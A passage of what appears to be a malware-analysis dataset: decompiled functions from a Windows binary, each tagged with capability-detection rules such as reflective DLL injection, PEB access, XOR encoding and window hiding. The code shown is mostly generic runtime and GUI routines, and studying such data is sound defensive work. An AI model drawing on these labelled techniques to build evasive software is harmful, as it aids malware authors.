        "decompiled_code": "\nvoid fcn.0041d2d0(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.004035e4();\n    fcn.00413ee4();\n    fcn.0041d884();\n    fcn.00403258();\n    fcn.00403258();\n    fcn.00403258();\n    sub.kernel32.dll_DeleteCriticalSection_1(iVar1 + 0x38);\n    fcn.004140f4();\n    if ('\\0' < extraout_DL) {\n        fcn.004035cc();\n    }\n    return;\n}\n",
        "token_count": 134
    },
    "0041d460": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d460(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.0041d8d8();\n    uVar1 = fcn.0041d0f0();\n    sub.user32.dll_FillRect(in_EAX[1], param_2, uVar1);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 115
    },
    "0041d49c": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d49c(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.0041d8d8();\n    uVar1 = fcn.0041d0f0();\n    sub.user32.dll_FrameRect(in_EAX[1], param_2, uVar1);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 115
    },
    "0041d5e4": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d5e4(int32_t *param_1)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_1 != NULL) {\n        (**(*in_EAX + 0x10))();\n        fcn.0041d8d8();\n        (**(*param_1 + 0x14))();\n        (**(*in_EAX + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "00427328": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00427328(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x427352;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + 0x30))();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 124
    },
    "004468dc": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.004468dc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x44696f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    uVar3 = *(in_EAX + 0x34);\n    uVar2 = sub.comctl32.dll_ImageList_Create\n                      (uVar3, *(in_EAX + 0x30), *(*(in_EAX + 0x41) * 4 + 0x461bdc) | 0xfe, *(in_EAX + 0x38), \n                       *(in_EAX + 0x38));\n    *(in_EAX + 0x3c) = uVar2;\n    cVar1 = fcn.0044666c();\n    if (cVar1 == '\\0') {\n        fcn.00405b0c();\n        fcn.0040b538();\n        fcn.004039e4();\n    }\n    if (*(in_EAX + 0x44) != 0x1fffffff) {\n        fcn.00446e48();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00403fa8(0x446976);\n    return;\n}\n",
        "token_count": 339
    },
    "0043ac0c": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid fcn.0043ac0c(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    fcn.0043909c();\n    uVar1 = (**(*in_EAX + -0x10))();\n    if ((*(in_EAX + 0x14) & 2) != 0) {\n        uVar1 = fcn.00439764();\n    }\n    if ((*(in_EAX + 0x14) & 8) != 0) {\n        uVar1 = fcn.00403454();\n    }\n    fcn.0043ab20(uVar1 & 0xffffff00 | *0x43ac5c);\n    return;\n}\n",
        "token_count": 158
    },
    "0043b614": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043b614(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x43b6b0;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.004033e4();\n    if (cVar1 == '\\0') {\n        fcn.00414204();\n    }\n    else {\n        (**(*in_EAX + 0x50))();\n        fcn.00445e00();\n        fcn.00445f38();\n        fcn.0043952c();\n        fcn.00445c98();\n        fcn.00446058();\n        (**(*param_2 + 0x34))(in_EAX[0x48], in_EAX[0x49]);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x43b6b7;\n    uStack28 = 0x43b6af;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 296
    },
    "0043e610": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e610(uint param_1, int32_t *param_2)\n\n{\n    (**(*param_2 + 0x68))();\n    return;\n}\n",
        "token_count": 42
    },
    "00445f38": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445f38(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.004043b4(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00403408();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x68))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00403ffc();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "00432858": {
        "rules": [
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.00432858(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x43286a;\n    cVar2 = (**(*in_EAX + 0x24))();\n    if (cVar2 != '\\0') {\n        piVar1 = in_EAX[10];\n        *(piVar1 + 0x82) = 1;\n        uStack20 = 0x4328ae;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        (**(*piVar1 + 0xcc))();\n        *in_FS_OFFSET = uStack24;\n        *(in_EAX[10] + 0x208) = 0;\n        return;\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "0041bbd4": {
        "rules": [
            "encode data using XOR",
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint16_t __fastcall fcn.0041bbd4(uint param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint8_t *in_EAX;\n    \n    uVar1 = 0;\n    do {\n        uVar1 = uVar1 << 5 & 0xff00 | (uVar1 << 5 | uVar1 >> 0xb) ^ *in_EAX;\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return uVar1;\n}\n",
        "token_count": 137
    },
    "00459fb4": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00459fb4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x84) != 0) {\n        cVar1 = fcn.0044000c();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.0043fd08();\n            iVar3 = sub.user32.dll_IsWindowVisible(uVar2);\n            if (iVar3 != 0) {\n                uVar2 = fcn.0043fd08(0);\n                sub.user32.dll_ShowWindow(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00402d64": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402d64(uint32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = in_EAX;\n    if (0xff < param_1) {\n        param_1 = 0xff;\n    }\n    do {\n        cVar1 = *param_2;\n        param_2 = param_2 + 1;\n        if (cVar1 == '\\0') break;\n        pcVar2 = pcVar2 + 1;\n        *pcVar2 = cVar1;\n        param_1 = param_1 - 1;\n    } while (param_1 != 0);\n    *in_EAX = pcVar2 - in_EAX;\n    return;\n}\n",
        "token_count": 177
    },
    "004031bc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004031bc(uint param_1, int32_t param_2)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint8_t uVar2;\n    \n    uVar2 = 0;\n    if (param_2 != 0) {\n        in_EAX = *(in_EAX + -0x2c);\n        uVar1 = *in_EAX;\n        if (uVar1 == *(param_2 + -4)) {\n            do {\n                uVar2 = 0;\n                if (((in_EAX[uVar1] ^ *(uVar1 + param_2 + -1)) & 0xdf) != 0) goto code_r0x004031df;\n                uVar1 = uVar1 - 1;\n            } while (uVar1 != 0);\n            uVar2 = 1;\n        }\n    }\ncode_r0x004031df:\n    return in_EAX & 0xffffff00 | uVar2;\n}\n",
        "token_count": 223
    },
    "004032bc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004032bc(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        in_EAX = *(iVar1 + -0x24);\n        if (*(iVar1 + -0x40) != 0) {\n            fcn.004049e4();\n        }\n    } while (in_EAX != NULL);\n    return;\n}\n",
        "token_count": 95
    },
    "00403408": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004027ec)\n\nvoid __fastcall fcn.00403408(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX != NULL) {\n        while (*in_EAX != param_2) {\n            in_EAX = *(*in_EAX + -0x24);\n            if (in_EAX == NULL) {\n                if (*0x463008 != NULL) {\n                    (**0x463008)();\n                }\n                fcn.004027c0();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 137
    },
    "00403484": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00403484(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == param_2) {\n            return 0x1;\n        }\n        piVar1 = *(in_EAX + -0x24);\n        if (piVar1 == NULL) break;\n        in_EAX = *piVar1;\n    }\n    return piVar1;\n}\n",
        "token_count": 116
    },
    "00403c30": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00403c30(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    iVar3 = *0x463640;\n    puStack20 = &stack0xfffffffc;\n    if (*0x46363c != 0) {\n        iVar1 = *(*0x46363c + 4);\n        uStack24 = 0x403c76;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        if (0 < iVar3) {\n            do {\n                iVar3 = iVar3 + -1;\n                pcVar2 = *(iVar1 + 4 + iVar3 * 8);\n                *0x463640 = iVar3;\n                if (pcVar2 != NULL) {\n                    (*pcVar2)();\n                }\n            } while (0 < iVar3);\n        }\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "00403c90": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00403c90(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x46363c != NULL) {\n        iVar1 = **0x46363c;\n        iVar4 = 0;\n        iVar2 = (*0x46363c)[1];\n        uStack24 = 0x403cd6;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        if (0 < iVar1) {\n            do {\n                pcVar3 = *(iVar2 + iVar4 * 8);\n                iVar4 = iVar4 + 1;\n                *0x463640 = iVar4;\n                if (pcVar3 != NULL) {\n                    (*pcVar3)();\n                }\n            } while (iVar4 < iVar1);\n        }\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 247
    },
    "004045ac": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004045ac(uint param_1, char *param_2)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    bool bVar7;\n    \n    if (in_EAX != NULL) {\n        if (param_2 == NULL) {\n            return 0;\n        }\n        iVar3 = *(in_EAX + -4) + -1;\n        if (-1 < iVar3) {\n            iVar1 = *(param_2 + -4) - iVar3;\n            bVar7 = iVar1 == 0;\n            pcVar5 = param_2;\n            if (!bVar7 && iVar3 <= *(param_2 + -4)) {\ncode_r0x004045cc:\n                do {\n                    if (iVar1 != 0) {\n                        iVar1 = iVar1 + -1;\n                        pcVar4 = pcVar5 + 1;\n                        bVar7 = *in_EAX == *pcVar5;\n                        pcVar5 = pcVar4;\n                        if (!bVar7) goto code_r0x004045cc;\n                    }\n                    iVar2 = iVar3;\n                    pcVar4 = in_EAX + 1;\n                    pcVar6 = pcVar5;\n                    if (!bVar7) goto code_r0x004045e0;\n                    do {\n                        if (iVar2 == 0) break;\n                        bVar7 = *pcVar4 == *pcVar6;\n                        iVar2 = iVar2 + -1;\n                        pcVar4 = pcVar4 + 1;\n                        pcVar6 = pcVar6 + 1;\n                    } while (bVar7);\n                } while (!bVar7);\n                in_EAX = pcVar5 + -param_2;\n                goto code_r0x004045f0;\n            }\n        }\ncode_r0x004045e0:\n        in_EAX = NULL;\n    }\ncode_r0x004045f0:\n    return CONCAT44(param_2, in_EAX);\n}\n",
        "token_count": 463
    },
    "004049d8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004027ec)\n\nvoid __fastcall fcn.004049d8(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 1;\n    cVar1 = *param_2;\n    if ((cVar1 != '\\n') && (cVar1 != '\\v')) {\n        if (cVar1 == '\\f') {\n            do {\n                *in_EAX = 0;\n                in_EAX[1] = 0;\n                in_EAX[2] = 0;\n                in_EAX[3] = 0;\n                in_EAX = in_EAX + 4;\n                iVar4 = iVar3 + -1;\n                bVar2 = 0 < iVar3;\n                iVar3 = iVar4;\n            } while (iVar4 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\r') {\n            do {\n                fcn.00404944();\n                iVar4 = iVar3 + -1;\n                bVar2 = 0 < iVar3;\n                iVar3 = iVar4;\n            } while (iVar4 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\x0e') {\n            do {\n                fcn.00404914();\n                iVar4 = iVar3 + -1;\n                bVar2 = 0 < iVar3;\n                iVar3 = iVar4;\n            } while (iVar4 != 0 && bVar2);\n            return;\n        }\n        if ((cVar1 != '\\x0f') && (cVar1 != '\\x11')) {\n            if (*0x463008 != NULL) {\n                (**0x463008)();\n            }\n            fcn.004027c0();\n            return;\n        }\n    }\n    do {\n        *in_EAX = 0;\n        in_EAX = in_EAX + 1;\n        iVar4 = iVar3 + -1;\n        bVar2 = 0 < iVar3;\n        iVar3 = iVar4;\n    } while (iVar4 != 0 && bVar2);\n    return;\n}\n",
        "token_count": 493
    },
    "00404b1c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004027ec)\n// WARNING: Removing unreachable block (ram,0x00404a9e)\n// WARNING: Removing unreachable block (ram,0x00404a84)\n\nvoid __fastcall fcn.00404b1c(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 1;\n    cVar1 = *param_2;\n    if (cVar1 == '\\n') {\n        fcn.00403fa8();\n    }\n    else if (cVar1 == '\\v') {\n        fcn.00404688();\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.00404a18();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.00404a30();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.004049e4();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.00405648();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x463008 != NULL) {\n                (**0x463008)();\n            }\n            fcn.004027c0();\n            return;\n        }\n        do {\n            fcn.00404f68();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    return;\n}\n",
        "token_count": 544
    },
    "00404dc0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004027ec)\n\nvoid __fastcall fcn.00404dc0(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.00403fa8();\n            }\n            else {\n                fcn.00403fcc();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00404688();\n            }\n            else {\n                fcn.004046a0();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.00404a18();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.00404a30();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.004049e4();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.00405648();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x463008 != NULL) {\n                    (**0x463008)();\n                }\n                fcn.004027c0();\n                return;\n            }\n            do {\n                fcn.00404f68();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 579
    },
    "00405044": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405044(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    piVar1 = *0x461034;\n    if (*0x461034 != NULL) {\n        do {\n            if (((in_EAX == piVar1[1]) || (in_EAX == piVar1[2])) || (in_EAX == piVar1[3])) {\n                fcn.00404ffc();\n                return;\n            }\n            piVar1 = *piVar1;\n        } while (piVar1 != NULL);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "0040506c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040506c(void)\n\n{\n    char *in_EAX;\n    \n    while ((*in_EAX != '\\0' && (*in_EAX != '\\\\'))) {\n        in_EAX = sub.user32.dll_CharNextA();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "004054b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004054b0(void)\n\n{\n    char cVar1;\n    code *in_EAX;\n    int32_t *piVar2;\n    \n    piVar2 = *0x461034;\n    if (*0x461034 != NULL) {\n        do {\n            fcn.00404ffc();\n            cVar1 = (*in_EAX)();\n            if (cVar1 == '\\0') {\n                return;\n            }\n            piVar2 = *piVar2;\n        } while (piVar2 != NULL);\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "0040550c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040550c(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if ((*0x461038 != NULL) && ((*0x461038)[1] == in_EAX)) {\n        *0x461038 = **0x461038;\n        fcn.004026dc();\n        return;\n    }\n    ppiVar2 = *0x461038;\n    if (*0x461038 != NULL) {\n        do {\n            ppiVar1 = *ppiVar2;\n            if ((ppiVar1 != NULL) && (ppiVar1[1] == in_EAX)) {\n                *ppiVar2 = *ppiVar1;\n                fcn.004026dc();\n                return;\n            }\n            ppiVar2 = *ppiVar2;\n        } while (ppiVar2 != NULL);\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "004055d8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004055d8(void)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint *var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    uStack16 = 0x40563c;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    var_4h = in_EAX;\n    fcn.0040556c();\n    *in_FS_OFFSET = uStack20;\n    puVar1 = *0x461034;\n    if (var_4h == *0x461034) {\n        *0x461034 = *var_4h;\n    }\n    else {\n        for (; puVar1 != NULL; puVar1 = *puVar1) {\n            if (*puVar1 == var_4h) {\n                *puVar1 = *var_4h;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "00407b34": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407b34(uint param_1, uint8_t **param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    \n    iVar2 = fcn.00404268();\n    fcn.004045f4();\n    puVar3 = *param_2;\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        uVar1 = *in_EAX;\n        if ((0x60 < uVar1) && (uVar1 < 0x7b)) {\n            uVar1 = uVar1 - 0x20;\n        }\n        *puVar3 = uVar1;\n        in_EAX = in_EAX + 1;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "00407d50": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407d50(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00404268();\n    for (iVar2 = 1; (iVar2 <= iVar1 && (*(in_EAX + -1 + iVar2) < 0x21)); iVar2 = iVar2 + 1) {\n    }\n    if (iVar1 < iVar2) {\n        fcn.00403fa8();\n    }\n    else {\n        for (; *(in_EAX + -1 + iVar1) < 0x21; iVar1 = iVar1 + -1) {\n        }\n        fcn.004044c8(param_2);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "00407e04": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407e04(uint32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar5;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar6;\n    char cVar4;\n    \n    puVar6 = unaff_ESI;\n    if (param_1 == '\\0') {\n        if (in_EAX < 0) {\n            fcn.00407e1a();\n            unaff_ESI[-1] = 0x2d;\n            return;\n        }\n        param_1 = 10;\n    }\n    do {\n        uVar2 = in_EAX / param_1;\n        puVar6 = puVar6 + -1;\n        cVar4 = in_EAX % param_1;\n        uVar3 = cVar4 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = cVar4 + 0x37;\n        }\n        *puVar6 = uVar3;\n        in_EAX = uVar2;\n    } while (uVar2 != 0);\n    iVar5 = param_2 - (unaff_ESI - puVar6);\n    if (unaff_ESI - puVar6 <= param_2 && iVar5 != 0) {\n        iVar1 = -iVar5;\n        while (iVar5 = iVar5 + -1,  iVar5 != 0) {\n            (puVar6 + iVar1)[iVar5] = 0x30;\n        }\n        puVar6[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 383
    },
    "004086dc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004086dc(uint param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar6 = 0xffffffff;\n    uVar4 = 0;\n    pcVar7 = param_2;\n    do {\n        if (uVar6 == 0) break;\n        uVar6 = uVar6 - 1;\n        cVar2 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar2 != '\\0');\n    uVar6 = ~uVar6;\n    bVar8 = true;\ncode_r0x004086f1:\n    do {\n        if (uVar6 != 0) {\n            uVar6 = uVar6 - 1;\n            pcVar1 = param_2 + 1;\n            pcVar7 = in_EAX + 1;\n            bVar8 = *in_EAX == *param_2;\n            in_EAX = pcVar7;\n            param_2 = pcVar1;\n            if (bVar8) goto code_r0x004086f1;\n        }\n        if (bVar8) {\n            return;\n        }\n        uVar3 = in_EAX[-1];\n        uVar5 = uVar4 & 0xffffff00 | uVar3;\n        if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n            uVar5 = uVar4 & 0xffffff00 | uVar3 - 0x20;\n        }\n        uVar3 = param_2[-1];\n        uVar4 = uVar3;\n        if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n            uVar4 = uVar3 - 0x20;\n        }\n        uVar4 = uVar5 - uVar4;\n        bVar8 = uVar4 == 0;\n        if (!bVar8) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 498
    },
    "0040871c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040871c(int32_t param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar4 = 0;\n    iVar6 = param_1;\n    pcVar7 = param_2;\n    if (param_1 != 0) {\n        do {\n            if (iVar6 == 0) break;\n            iVar6 = iVar6 + -1;\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar2 != '\\0');\n        param_1 = param_1 - iVar6;\n        bVar8 = true;\ncode_r0x00408735:\n        do {\n            if (param_1 != 0) {\n                param_1 = param_1 + -1;\n                pcVar1 = param_2 + 1;\n                pcVar7 = in_EAX + 1;\n                bVar8 = *in_EAX == *param_2;\n                in_EAX = pcVar7;\n                param_2 = pcVar1;\n                if (bVar8) goto code_r0x00408735;\n            }\n            if (bVar8) {\n                return;\n            }\n            uVar3 = in_EAX[-1];\n            uVar5 = uVar4 & 0xffffff00 | uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar5 = uVar4 & 0xffffff00 | uVar3 - 0x20;\n            }\n            uVar3 = param_2[-1];\n            uVar4 = uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar4 = uVar3 - 0x20;\n            }\n            uVar4 = uVar5 - uVar4;\n            bVar8 = uVar4 == 0;\n        } while (bVar8);\n    }\n    return;\n}\n",
        "token_count": 501
    },
    "00408760": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.00408760(uint param_1, char param_2)\n\n{\n    char *in_EAX;\n    \n    while( true ) {\n        if (param_2 == *in_EAX) {\n            return in_EAX;\n        }\n        if (*in_EAX == '\\0') break;\n        in_EAX = in_EAX + 1;\n    }\n    return NULL;\n}\n",
        "token_count": 88
    },
    "00408774": {
        "rules": [
            "contain loop"
        ],
